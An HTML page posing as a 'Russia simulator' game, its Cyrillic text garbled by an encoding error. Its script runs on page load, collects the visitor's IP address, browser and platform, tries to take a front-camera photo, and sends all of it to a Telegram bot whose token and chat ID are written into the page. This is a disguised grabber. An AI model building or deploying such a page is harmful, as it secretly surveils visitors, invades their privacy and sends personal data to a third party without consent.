<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ú–∞—Ç—Ä–µ—à–∫–∞ ‚Äî —Å–∏–º—É–ª—è—Ç–æ—Ä –Ω–∞—Å—Ç–æ—è—â–µ–π –†–æ—Å—Å–∏–∏</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            color: white;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        /* –û—Å—Ç–∞–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
    </style>
</head>
<body>
    <div class="container">
        <!-- –í–∞—à–∞ HTML-—Ä–∞–∑–º–µ—Ç–∫–∞ -->
    </div>

    <script>
        // 1. –ü–†–ê–í–ò–õ–¨–ù–´–ï –î–ê–ù–ù–´–ï (–∏–∑ –≤–∞—à–µ–≥–æ –æ—Ç–≤–µ—Ç–∞)
        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const CHAT_ID = '-1002680412435'; // –ò—Å–ø–æ–ª—å–∑—É–µ–º ID —Å—É–ø–µ—Ä–≥—Ä—É–ø–ø—ã
        
        // 2. –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è –∏ –Ω–∞–¥–µ–∂–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        async function sendToTelegram(message, photo = null) {
            const url = photo ? 
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto` :
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const formData = new FormData();
            if (photo) {
                formData.append('photo', photo);
                formData.append('caption', message);
            } else {
                formData.append('text', message);
            }
            formData.append('chat_id', CHAT_ID);
            
            try {
                // –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—Ä–æ—Å
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                // –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–≤–µ—Ç–∞
                if (!response.ok) {
                    throw new Error('–û—à–∏–±–∫–∞ Telegram API');
                }
                return true;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ URL
                try {
                    const fallbackUrl = photo ?
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&caption=${encodeURIComponent(message)}` :
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                    
                    await fetch(fallbackUrl);
                    return true;
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏:', e);
                    return false;
                }
            }
        }

        // 3. –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        async function collectData() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                return {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    date: new Date().toLocaleString('ru-RU')
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:', error);
                return {
                    ip: '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    date: new Date().toLocaleString('ru-RU')
                };
            }
        }

        // 4. –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        window.onload = async function() {
            const data = await collectData();
            const message = `üîî –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å!\n\n` +
                          `üïí –í—Ä–µ–º—è: ${data.date}\n` +
                          `üåê IP: ${data.ip}\n` +
                          `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${data.userAgent}\n` +
                          `üñ• –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.platform}`;
            
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Ñ–æ—Ç–æ
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());
                
                canvas.toBlob(async (blob) => {
                    await sendToTelegram(message, blob);
                }, 'image/jpeg', 0.8);
                
            } catch (error) {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ñ–æ—Ç–æ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç');
                await sendToTelegram(message);
            }
        };
    </script>
</body>
</html>
